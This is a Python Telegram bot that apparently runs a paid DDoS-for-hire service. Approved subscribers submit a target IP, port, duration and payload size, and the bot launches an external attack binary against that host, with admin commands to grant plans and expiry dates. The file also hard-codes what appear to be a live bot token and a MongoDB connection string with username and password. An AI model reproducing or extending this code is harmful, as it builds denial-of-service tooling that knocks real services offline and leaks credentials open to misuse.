import telebot
import logging
import subprocess
import os
import signal
import ipaddress
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Configuration
TOKEN = os.getenv("TELEGRAM_TOKEN", "8144243468:AAGkxy-Gd12EsEosyUR6AYwIm6x44NQoDz8")
MONGO_URI = os.getenv("MONGO_URI", "mongodb+srv://MasterBhaiyaa:MasterBhaiyaa@master.8aan4.mongodb.net/")
CHANNEL_ID = -1002174145175
ADMIN_IDS = [1077368861]
blocked_ports = [8700, 20000, 20001, 443, 17500, 9031, 20002]

# Logging setup
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# MongoDB setup
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['master']
users_collection = db.users

# Telegram bot setup
bot = telebot.TeleBot(TOKEN)

# In-memory storage
user_attack_details = {}  # Stores (target_ip, target_port, duration, payload_size)
active_attacks = {}  # Stores (target_ip, target_port) -> PID

def run_attack_command_sync(target_ip, target_port, duration, payload_size, action):
    if action == 1:
        try:
            process = subprocess.Popen(
                ["./MasterBhaiyaa", target_ip, str(target_port), str(duration), str(payload_size)],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            active_attacks[(target_ip, target_port)] = process.pid
            stdout, stderr = process.communicate(timeout=5)  # Capture initial output
            if stderr:
                if "EXPIRED" in stderr:
                    bot.send_message(CHANNEL_ID, "*Error: Attack binary has expired. Contact @MasterBhaiyaa.*", parse_mode='Markdown')
                else:
                    bot.send_message(CHANNEL_ID, f"*Attack error: {stderr}*", parse_mode='Markdown')
                active_attacks.pop((target_ip, target_port), None)
        except FileNotFoundError:
            bot.send_message(CHANNEL_ID, "*Error: Attack binary not found.*", parse_mode='Markdown')
        except subprocess.TimeoutExpired:
            pass  # Process is running in the background
        except Exception as e:
            logging.error(f"Failed to start attack: {e}")
            bot.send_message(CHANNEL_ID, "*Error starting attack.*", parse_mode='Markdown')
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                os.kill(pid, signal.SIGINT)  # Send SIGINT for graceful termination
                bot.send_message(CHANNEL_ID, f"*Attack stopped for Host: {target_ip} and Port: {target_port}*", parse_mode='Markdown')
            except ProcessLookupError:
                logging.error(f"Process with PID {pid} not found")
            except Exception as e:
                logging.error(f"Failed to stop process with PID {pid}: {e}")

def is_user_admin(user_id, chat_id):
    try:
        chat_member = bot.get_chat_member(chat_id, user_id)
        return chat_member.status in ['administrator', 'creator'] or user_id in ADMIN_IDS
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        valid_until = user_data.get('valid_until')
        if valid_until and datetime.now().date() <= datetime.fromisoformat(valid_until).date():
            return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

def send_main_buttons(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn_attack = KeyboardButton("ATTACK")
    btn_start = KeyboardButton("Start Attack 🚀")
    btn_stop = KeyboardButton("Stop Attack")
    markup.add(btn_attack, btn_start, btn_stop)
    bot.send_message(message.chat.id, "*Choose an action:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    send_main_buttons(message)

@bot.message_handler(commands=['approve'])
def approve_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 4:
            bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days>*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        plan = int(cmd_parts[2])
        days = int(cmd_parts[3])
        
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else ""
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        bot.send_message(chat_id, f"*User {target_user_id} approved with plan {plan} for {days} days.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approving user: {e}")
        bot.send_message(chat_id, "*Error approving user.*", parse_mode='Markdown')

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id, chat_id):
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    try:
        cmd_parts = message.text.split()
        if len(cmd_parts) != 2:
            bot.send_message(chat_id, "*Invalid command format. Use /disapprove <user_id>.*", parse_mode='Markdown')
            return

        target_user_id = int(cmd_parts[1])
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        bot.send_message(chat_id, f"*User {target_user_id} disapproved and reverted to free.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in disapproving user: {e}")
        bot.send_message(chat_id, "*Error disapproving user.*", parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data:
        plan = user_data.get('plan', 0)
        valid_until = user_data.get('valid_until', '')
        status = "Approved" if check_user_approval(user_id) else "Not Approved"
        message = f"*Your Status*\nPlan: {plan}\nValid Until: {valid_until or 'N/A'}\nStatus: {status}"
    else:
        message = "*No account found. Contact an admin to get approved.*"
    
    bot.send_message(chat_id, message, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    bot.send_message(chat_id, "*Please provide target IP, port, duration (seconds), and payload size (bytes) separated by spaces.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

def process_attack_ip_port(message):
    try:
        args = message.text.split()
        if len(args) != 4:
            bot.send_message(message.chat.id, "*Invalid format. Use: <IP> <port> <duration> <payload_size>*", parse_mode='Markdown')
            return

        target_ip, target_port, duration, payload_size = args[0], int(args[1]), int(args[2]), int(args[3])

        # Validate IP
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            bot.send_message(message.chat.id, "*Invalid IP address.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked.*", parse_mode='Markdown')
            return

        if duration <= 0 or payload_size <= 0:
            bot.send_message(message.chat.id, "*Duration and payload_size must be positive.*", parse_mode='Markdown')
            return

        user_attack_details[message.from_user.id] = (target_ip, target_port, duration, payload_size)
        send_main_buttons(message)
    except ValueError:
        bot.send_message(message.chat.id, "*Invalid port, duration, or payload_size.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack parameters: {e}")
        bot.send_message(message.chat.id, "*Error processing attack parameters.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "ATTACK")
def attack_button(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    bot.send_message(chat_id, "*Please provide target IP, port, duration (seconds), and payload size (bytes) separated by spaces.*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_ip_port)

@bot.message_handler(func=lambda message: message.text == "Start Attack 🚀")
def start_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        target_ip, target_port, duration, payload_size = attack_details
        run_attack_command_sync(target_ip, target_port, duration, payload_size, 1)
        bot.send_message(chat_id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nDuration: {duration}s\nPayload: {payload_size} bytes*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*No attack parameters set. Use /Attack.*", parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text == "Stop Attack")
def stop_attack(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    attack_details = user_attack_details.get(user_id)
    if attack_details:
        target_ip, target_port, _, _ = attack_details
        run_attack_command_sync(target_ip, target_port, 0, 0, 2)
        user_attack_details.pop(user_id, None)
    else:
        bot.send_message(chat_id, "*No active attack found to stop.*", parse_mode='Markdown')

if __name__ == "__main__":
    logging.info("Starting bot...")
    bot.polling(none_stop=True)